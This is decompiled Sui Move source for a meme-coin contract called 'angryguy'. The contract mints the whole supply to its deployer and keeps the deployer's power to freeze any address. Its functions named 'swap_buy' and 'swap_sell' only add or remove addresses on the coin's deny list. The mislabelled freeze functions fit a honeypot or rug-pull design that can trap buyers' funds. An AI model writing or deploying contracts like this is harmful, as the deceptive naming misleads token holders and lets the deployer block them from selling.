module 0xa448973083215b6743ab883e6c68274948c498dcfd7e9db9b1edf1458974f30b::angryguy {
    struct ANGRYGUY has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: ANGRYGUY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<ANGRYGUY>(arg0, 9, b"angryguy", b"Just an angry guy", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmZWR1N17tbPf2YGqtXjL7QMAmFxwbqiVPpj6tNBD63uiM"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<ANGRYGUY>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ANGRYGUY>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<ANGRYGUY>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<ANGRYGUY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ANGRYGUY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ANGRYGUY>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ANGRYGUY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<ANGRYGUY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

